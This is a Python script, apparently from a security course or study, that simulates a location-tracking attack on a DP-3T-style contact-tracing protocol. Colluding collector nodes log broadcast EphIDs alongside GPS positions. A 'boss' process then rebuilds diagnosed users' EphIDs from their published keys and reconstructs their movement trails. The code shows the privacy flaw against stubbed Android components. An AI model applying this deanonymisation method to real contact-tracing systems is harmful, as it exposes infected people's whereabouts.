
import os
import random
from source import timeframework as time
import time as real_time
import threading
import secrets
import sys
import hmac
import hashlib
import json
from Crypto.Cipher import AES 
from Crypto.Util import Counter
import urllib.request
import source.timeframework
from fake_android import BluetoothLeAdvertiser, BluetoothLeScanner, UdpClient, LocationManager
from source import timeframework

# 1. several mallory collect ephids together with the lat, long and timestamp
# 2. when a person is diagnosed and uppload their Sk, 
# 3. mallory dowload Sks list and recreate EphIDs and deduce which recorded position belog to which diagnosed person
#     - take one Sk from the db,
#     - recreate all EphIds from Sk
#     - cross reference those EphIDs with the list of collected positions to know where and when the person has been seen 
# 4. create a polyline and show on the map



EPHIDS_SIZE = 16
EPOCHS_PER_DAY = 24*4
stolen_pos = dict()


class MalloryCollector: 
    """ This class represent a malicious collector of EphIds, position and time"""
    
    def __init__(self, name, udp_client):
        #an empty set#
        self.udp_client= udp_client
        self.name = name
        self.lat = None
        self.lng = None
        self.start_listen_to_ephids()
        self.start_listen_to_gps()
        self.broadcasting = BluetoothLeAdvertiser(self.name, self.udp_client)
        self.broadcasting.start_advertising(3000000, b'')
        
    def start_listen_to_ephids(self):
        """starting the thread that listen to other devices"""
        self.bluetooth_scanner = BluetoothLeScanner(self.receive_ephid, self.udp_client)
  
    def receive_ephid(self, ephid):
        """store ephId, lat, lng, time in a map"""
        if ephid not in stolen_pos:
           stolen_pos[ephid] = list()
        if self.lat is None: 
            return
        stolen_pos[ephid].append((self.lat, self.lng, time.time()))  
            
    def start_listen_to_gps(self):
        """subscribe to location updates from the device's gps"""
        self.location = LocationManager(self.udp_client, self.collect_location)
    
    def collect_location(self, lat, lng):
        """when new location is known, store it"""
        self.lat = lat
        self.lng = lng
        
   
class MalloryBoss: 
    """ Class responsable for dowloading Sk , generationg location trails"""
    # create location trail 
    #show on a map
    
    def __init__(self, name, udp_client):
        #an empty set#
        self.udp_client= udp_client
        self.name = name
        self.start_download_infected_sk()
        self.handled_sk = set()
    
    def start_download_infected_sk(self):
        self.download_thread = threading.Thread(target=self.download_infected_thread)
        self.download_thread.start()
    
    def download_infected_thread(self):
        """ download the list with the sks (for the first infected day) of those pepole who have been declared infected"""
        while True:
            #read from the health care database
            with open('healthCareDataBase.txt', 'r') as file:
                sk_infected_list= file.readlines()

                #create ephIds for eery person
                for sk_and_time in sk_infected_list:
                    location_trail = list()
                   
                    sk = sk_and_time.split(',')[0]
                    if sk in self.handled_sk:
                        continue
                    else:
                        self.handled_sk.add(sk)
                    sk = bytearray.fromhex(sk)
                    timestamp =  sk_and_time.split(',')[1]
                    timestamp = int(timestamp.strip())
                    #loop from time of sk to today in simulated world
                    for t in range(timestamp, timeframework.get_today_index()):
                        infected_ephids = self.generate_ephids(sk)
                        sk = self.get_next_key(sk)
                        for infected_ephid in infected_ephids:
                            #check if there is a match 
                            if infected_ephid in stolen_pos:
                                #loop over tuples
                                for (lat, lng, timestamp) in stolen_pos[infected_ephid]:
                                   location_trail.append((round(lat, 6), round(lng, 6), int(timestamp)))
                    #check if list is not empty, meaning that there is a match 
                    if location_trail:
                       #convert location_trail to json and ecode it into bytearray to send through udp
                       location_trail_json= json.dumps(location_trail)
                       # print(location_trail_json)
                       datagram = location_trail_json.encode('utf-8')
                       self.udp_client.send(datagram)
            # Do this every hour
            time.task_sleep( 60 * 60)
        
    def get_next_key(self, key):
        sha = hashlib.sha256()
        sha.update(key)
        return sha.digest()
    
    def generate_ephids(self, key):
        """ephids are generated by hashing the string broadcast key"""
        eph_ids = []
        #create a hmac object#
        hashed_key= hmac.new(key, digestmod='sha256')
        # create a pseudo-random number#
        hashed_key.update("broadcast key".encode("utf-8"))
        prf = hashed_key.digest()
        #create a counter of 128 bits#
        counter = Counter.new(128)
        #create a pseudo number generator#
        cipher = AES.new(prf, AES.MODE_CTR, counter= counter)
        #generate all ephids for one day#
        ephids_all = cipher.encrypt(bytes(EPHIDS_SIZE * EPOCHS_PER_DAY))
        #dived all ephids into chuncks#
        eph_ids = [
            ephids_all[i:i+EPHIDS_SIZE]
            for i in range (0, len(ephids_all), EPHIDS_SIZE)
        ]
        #shuffle the ids#
        random.shuffle(eph_ids)
        return eph_ids
   

       
argument = sys.argv[1]
if argument.isnumeric():
    #A number was passed in. Start this many clients#
    number_of_clients = int(argument)
    for i in range(0, number_of_clients):
        real_time.sleep(random.uniform(0.05, 0.25))
        client = MalloryCollector(f'Mallory{i}',  UdpClient())
else:
    #A string was passed in. Start one client with this name#
    client = MalloryCollector(argument, UdpClient())
boss = MalloryBoss('Mallory Boss', UdpClient())